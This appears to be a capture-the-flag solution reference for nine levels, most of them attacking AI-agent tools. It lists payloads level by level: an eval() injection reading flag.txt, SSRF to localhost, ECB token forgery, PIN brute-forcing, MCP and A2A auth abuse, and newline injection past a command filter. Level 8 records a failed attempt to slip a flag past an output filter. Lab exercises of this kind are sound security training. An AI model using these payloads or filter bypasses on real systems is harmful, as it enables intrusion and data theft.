# Advanced Track — Reproduction Reference

## L1: Context Gateway — Multi-Step Diagnostic Chain
- view_system_logs → AuthService unresponsive, needs Diagnostic ID
- generate_diagnostic_id → DBG-8821
- check_service_health(AuthService, DBG-8821) → env dump: ENV_SCAN_MODE=storm
- discover_services(scan_mode=storm) → flag-REDACTED

## L2: The Keymaker — ECB Cut-and-Paste
- vault_info → AES-128-ECB, 16-byte blocks, token format: role=guest&user=<input>
- encrypt("role=admin&user=") → 3 blocks
- Block 2 = encrypt("role=admin&user=") 
- unlock_vault(Block2+Block3) → ACCESS GRANTED, flag-REDACTED

## L3: The Archivist — A2A Nonce Auth
- scan_systems → vault-agent at /level/3/a2a, A2A protocol
- GET .well-known/agent.json → nonce-response auth scheme
- tasks/send {request_access} → nonce: <REDACTED>
- tasks/send {same task id, nonce in message} → flag-REDACTED

## L4: Mastermind — PIN Brute-Force
- Test 0000-9999 → digits present: {1,3,5,8}
- Test permutations → <REDACTED> is correct PIN → flag-REDACTED

## L5: Bad Robot — Python eval() Injection
- ord(open("flag.txt").read()[N]) → character-by-character extraction → flag-REDACTED

## L6: The Enemy Within — SSRF
- fetch_and_summarize("http://127.0.0.1/flag.txt") → flag-REDACTED

## L7: Master of Resources — MCP Exposure
- POST /level/7/mcp → initialize → capture mcp-session-id
- resources/list → resource://flag
- tools/call unlock_flag → resources/read resource://flag → flag-REDACTED

## L8: The Silent Transmission — UNSOLVED (server timeout)
- retrieve_flag → "Response blocked: Content contains restricted information"
- http_get → timeout on all calls
- Output filter blocks flag; exfiltration tools broken

## L9: Blind Network Ninja — Boolean Blind Exfiltration
- \n injection bypasses command filter
- grep -q 'flag-{prefix}{char}' flag.txt → Online/Offline oracle
- Character-by-character extraction → flag-REDACTED